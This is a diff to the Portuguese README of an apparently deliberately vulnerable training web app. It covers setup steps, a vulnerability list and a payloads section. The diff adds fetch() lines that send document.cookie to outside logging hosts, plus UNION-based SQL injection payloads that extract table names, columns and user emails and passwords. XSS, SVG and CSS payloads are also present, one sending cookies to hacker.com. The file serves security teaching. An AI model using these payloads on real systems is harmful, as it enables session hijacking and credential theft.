@@ -18,14 +18,9 @@ docker-compose up
 
 ### 2. Criação do banco de dados.
 
-- Executar o script de criação do banco de dados que se encontra em dvsn-api/script.sql informando a senha **Postgres123**:
-
-```
-$ psql -U postgres -h 172.45.45.10 -d postgres -a -f ./dvsn-api/script.sql
-```
-- **ou** executar o script:
-```
-$ ./create-db.sh
+- Entrar na pasta **dvsn** e executar o script:
+```bash
+$ ./create-database.sh
 ```
 
 ### 3. Entrar na pasta do front (dvsn-client) e dar build no projeto, para que os arquivos sejam colocados ná pasta estática da api.
@@ -71,6 +66,9 @@ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certifi
 - Como manter componentes/frameworks/libs seguras e atualizadas
 - Cabeçalhos CSP e X-Frame-Options
 
+## Software Composition Analysis (SCA)
+- NodeJS/JavaScript: <a href="https://www.npmjs.com/package/yarn-audit-html">yarn audit html report</a>
+
 ## Vulnerabilidades
 - SQL Injection
     - Login
@@ -81,16 +79,19 @@ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certifi
     - DOM
         - Filtro na listagem de POSTS
     - Stored
-        - Comentários dos posts
+        - Comentários dos posts    
+- Cookie
+    - É apenas um base64 e a aplicação confia no que o cliente envia.
+
+fetch('https://servidor-de-log.free.beeceptor.com/todos?cookie=' +  document.cookie)
+fetch('http://logger.crescer.lab/?cookie=' +  document.cookie)
 
 ## Payloads:
 - XSS
 ```html
 <img src="a" onerror="alert('XSS')" />
 ```
-https://github.com/payloadbox/xss-payload-list
-https://developer.mozilla.org/pt-BR/docs/Web/JavaScript/Reference/Global_Objects/eval
-
+- SVG
 ```html
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
@@ -102,11 +103,27 @@ https://developer.mozilla.org/pt-BR/docs/Web/JavaScript/Reference/Global_Objects
   </script>
 </svg>
 ```
-- SQL Injection
+- SQL Injection (Login)
+- SQL Injection (Lista de usuários)
+```sql
+' union select 1, '2', '3', '4', '5', '6', 1, now(), now()--
+```
+```sql
+' union select floor(random() * 1000), '2', table_name, '4', '5', '6', 1,now(), now() from information_schema.tables where table_schema = 'public'--
+```
+```sql
+' union select floor(random() * 1000), table_name, column_name, '4', '5', '6', 1,now(), now() from information_schema.columns where table_schema = 'public'--
+```
+```sql
+' union select floor(random() * 1000), '2', string_agg(column_name,','), '4', '5', '6', 1,now(), now() from information_schema.columns where table_name = 'usuario'--
+```
+```sql
+' union select floor(random() * 1000), '2', concat(email,' ' ,senha), '4', '5', '6', 1,now(), now() from usuario--
+```
 
 https://github.com/payloadbox/sql-injection-payload-list
 - CSS Injection
-http://localhost:8080/hello?nome=Gabriel#red;margin-left:50px;background-image:url('http://localhost:8080/favico.ico')
+/hello?nome=Teste#red;margin-left:50px;background-image:url('http://localhost:8080/favicon.ico')
 - expression(document.write('<iframe src=" .= "http://hacker.com?cookie=' + document.cookie.escape() + " />'))
 background-image: url(javascript:alert('XSS'))
 https://www.mediawiki.org/wiki/Preventing_XSS_Attacks_through_CSS_Whitelisting
@@ -115,10 +132,14 @@ https://www.mediawiki.org/wiki/Preventing_XSS_Attacks_through_CSS_Whitelisting
 - <s>Prevenção de XSS configurável.</s>
 - <s>Prevenção de SQL Injection configurável.</s>
 - <s>Adicionar XSS em SVG e CSS.</s>
-- Validar tipos de autenticação e adicionar Token Opaco.
+- <s>Validar tipos de autenticação e adicionar Token Opaco.</s>
+- Adicionar cabeçalhos CSP e X-Frame-Options configuráveis.
+- Adicionar certificados SSL.
 
 
 ## Exemplos de vulnerabilidades:
 - <a href="https://security.snyk.io/vuln/SNYK-JS-MATERIALIZECSS-2324800">XSS materialize-css</a>
+
 ## Referências
 https://developer.mozilla.org/pt-BR/docs/Web/JavaScript/Reference/Global_Objects/eval
+https://github.com/payloadbox/xss-payload-list
